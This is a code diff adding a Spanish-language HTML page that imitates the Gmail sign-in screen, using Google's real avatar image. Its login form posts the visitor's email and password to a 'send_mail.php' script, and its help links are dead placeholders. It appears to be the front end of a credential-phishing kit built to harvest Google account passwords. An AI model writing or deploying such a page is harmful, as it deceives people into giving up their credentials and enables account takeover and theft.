@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login de Gmail</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Avatar" class="avatar">
+            <h2>Iniciar sesión</h2>
+            <form action="send_mail.php" method="POST">
+                <div class="textbox">
+                    <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
+                </div>
+                <div class="textbox">
+                    <input type="password" name="password" placeholder="Contraseña" required>
+                </div>
+                <input type="submit" class="btn" value="Siguiente">
+            </form>
+            <div class="link">
+                <a href="#">¿Has olvidado tu correo electrónico?</a>
+            </div>
+            <div class="link">
+                <a href="#">¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.</a>
+            </div>
+            <div class="create-account">
+                <a href="#">Crear cuenta</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
